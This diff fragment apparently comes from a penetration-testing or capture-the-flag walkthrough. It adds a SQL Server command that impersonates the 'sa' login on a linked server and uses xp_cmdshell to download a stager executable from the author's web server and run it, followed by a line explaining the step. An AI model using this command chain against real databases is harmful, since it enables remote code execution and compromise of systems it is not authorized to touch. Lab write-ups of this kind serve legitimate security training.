@@ -1194,6 +1194,8 @@ Then ill set up the web server
 Now i can run the query through xp_cmdshell
 
 ```python
-
+EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell "curl http://10.10.14.61/stager.exe -o C:\Temp\stager.exe && C:\Temp\stager.exe"') AT [PRIMARY];
 ```
+
+This will go to my web server get the stager and save it in the `C:\Temp` directory i made, then execute it 
 
